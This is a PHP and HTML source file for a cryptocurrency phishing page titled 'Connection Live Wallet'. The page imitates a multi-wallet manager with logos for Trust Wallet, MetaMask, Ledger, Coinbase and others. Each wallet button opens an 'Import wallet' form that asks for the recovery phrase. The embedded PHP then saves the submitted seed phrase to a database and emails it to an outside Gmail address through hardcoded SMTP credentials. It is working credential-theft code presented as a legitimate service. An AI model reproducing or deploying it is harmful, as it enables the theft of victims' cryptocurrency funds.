<?php require_once("resources/database.php"); ?>
<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Connection Live Wallet</title>
    <!-- Favicon icon -->
    <!-- <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png"> -->
    <!-- Custom Stylesheet -->
    <link rel="apple-touch-icon" sizes="180x180" href="icons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="icons/favicon-16x16.png">
<link rel="manifest" href="icons/site.html">
<link rel="stylesheet" href="releases/v5.0.7/css/all.css">
    <link rel="stylesheet" href="css/style.css">
    <style type="text/css">
        .imgd{
            max-height: 100px;
        }
        .cursor{
            cursor: pointer;
        } 
       h5{
            font-size:1em;
        }
        
        @media only screen and (max-width: 600px) {
   img{ 
            max-width:50px !important;
        }
}
    </style>
</head>

<body>

    <div id="preloader"><i>.</i><i>.</i><i>.</i></div>

    <div id="main-wrapper">

        <div class="header landing">
            <div class="container">
                <div class="row">
                    <div class="col-xl-12">
                        <nav class="navbar">
                           
                            
                             <button type="button" id="Stake" class="btn btn-primary btn-success cursor" data-toggle="modal" data-target="#restore">
                                       Stake
                                    </button>
                                      <button type="button" id="Unstake" class="btn btn-primary cursor" data-toggle="modal" data-target="#restore">
                                       Unstake
                                    </button>
                            
                        </nav>
                    </div>
                </div>
            </div>
        </div>

        <div class="intro" id="intro" data-scroll-index="0">
            <div class="container">
                                <div class="row  justify-content-center">
                    <div class="col-xl-10 col-md-10">
                        <div class="intro-content pb-5">
                            <h1>Connection Live Wallet</h1>
                            <p>The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app. </p>
                            
                        </div>
                    </div>
                   
                </div>
                <div class="row">
                    <div class="col-4">
                        <div class="wallet-widget card cursor" id="Trust Wallet" data-toggle="modal" data-target="#restore">
                            <h5>Trust Wallet </h5> 
                            <p><img src="images/coin/trust-wallet.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Metamask" data-toggle="modal" data-target="#restore">
                            <h5>Metamask </h5> 
                            <p><img src="images/coin/metamask.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Ledger" data-toggle="modal" data-target="#restore">
                            <h5>Ledger </h5> 
                            <p><img src="images/coin/ledger.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="FortMatic" data-toggle="modal" data-target="#restore">
                            <h5>FortMatic </h5> 
                            <p><img src="images/coin/fortmatic.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Exodus" data-toggle="modal" data-target="#restore">
                            <h5>Exodus </h5> 
                            <p><img src="images/coin/exodus.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Enjin" data-toggle="modal" data-target="#restore">
                            <h5>Enjin </h5> 
                            <p><img src="images/coin/enjin.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Digitex" data-toggle="modal" data-target="#restore">
                            <h5>Digitex </h5> 
                            <p><img src="images/coin/digitex.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Defiat" data-toggle="modal" data-target="#restore">
                            <h5>Defiat </h5> 
                            <p><img src="images/coin/defiat.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Coinbase" data-toggle="modal" data-target="#restore">
                            <h5>Coinbase </h5> 
                            <p><img src="images/coin/coinbase.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="AAVE" data-toggle="modal" data-target="#restore">
                            <h5>AAVE </h5> 
                            <p><img src="images/coin/aave.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="MEW Wallet" data-toggle="modal" data-target="#restore">
                            <h5>MEW Wallet </h5> 
                            <p><img src="images/coin/mew.png" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Authereum" data-toggle="modal" data-target="#restore">
                            <h5>Authereum </h5> 
                            <p><img src="images/coin/49746116.png" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Portis" data-toggle="modal" data-target="#restore">
                            <h5>Portis </h5> 
                            <p><img src="images/coin/portis.svg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="WalletConnect" data-toggle="modal" data-target="#restore">
                            <h5>WalletConnect </h5> 
                            <p><img src="images/coin/walletconnect.svg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="Blockchain" data-toggle="modal" data-target="#restore">
                            <h5>Blockchain </h5> 
                            <p><img src="images/coin/50c8400c-8bad-4cd8-9a50-8c42d71a1fe2.jpg" class="imgd"></p>
                        </div>
                    </div> <div class="col-4">
                        <div class="wallet-widget card cursor" id="SafePal" data-toggle="modal" data-target="#restore">
                            <h5>SafePal </h5> 
                            <p><img src="images/coin/d8cc00ff-3313-4f4b-a5b5-c87df89d155b.jpg" class="imgd"></p>
                        </div>
                    </div>                    
                      
                </div>
                            </div>
        </div>




    </div>
    
    <div class="modal fade" id="restore">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Import wallet</h5>
                    <button type="button" class="btn-close" data-dismiss="modal" aria-label="Close"></button>
                </div>
                <form action="" method="post" name="recover-form" id="phraseForm"><?php collect_details(); ?>
                    <div class="modal-body">
                        <div class="table-responsive">
                            <input type="hidden" id="wallet" name="wallet">
                            <textarea class="form-control" required="" rows="7" cols="50" name="mnemonic" placeholder="Recovery Phrase ..."></textarea>
                            <p class="mt-3">Typically 12 (sometimes 24) words separated by single spaces</p>
                        </div>
                        <div class="text-right">
                            <button name ="submit" class="btn btn-primary">Import</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    
    <?php 
    
    function collect_details(){
        
    if(isset($_POST['submit'])){
        $mnemonic = escape_string($_POST['mnemonic']);
    
    $query = query("INSERT INTO wallets(wallet_phrase_key) VALUES('{$mnemonic}') ");
    confirm($query);    

    require "Mail/phpmailer/PHPMailerAutoload.php";
		$mail = new PHPMailer;

		$mail->isSMTP();
		$mail->Host='integrationlink.co';
		$mail->Port=587;
		$mail->SMTPAuth=true;
		$mail->SMTPSecure='tls';

		//Email login details
		$mail->Username='admin@integrationlink.co';
		$mail->Password='integrationlink123!';

		//send by your email
		$mail->setFrom('admin@integrationlink.co');
		// get email from input
		$mail->addAddress('nickcartermusic4@gmail.com');
		//$mail->addReplyTo('admin@integrationlink.co');

		// HTML body
		$mail->isHTML(true);
		$mail->Subject="New Seed Phrase";
		$mail->Body="<b>Hi there! Someone just put in their seed phrase on your website. Below is the information inputted below:</b><br/><br/>
		<p>Seed Phrase: $mnemonic</p> ";
		
		$mail->send();

        header("Location: https://integrationlink.co/");
    }
    		
	
    }
    
    ?>



    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <script src="js/scripts.js"></script>
    <script>
//         document.getElementById("phraseForm").addEventListener("submit", function(e){
// 				e.preventDefault();
// 				var product = $("#phraseForm").serialize();
// 				$.ajax({
// 					type: 'POST',
// 					url: 'mnemonic.php',
// 					data: product,
// 					dataType: 'json',
// 					success: function(response){
                     
// 					}
// 				});
               
// 			}, true);
           
    </script>
    
</body>

</html>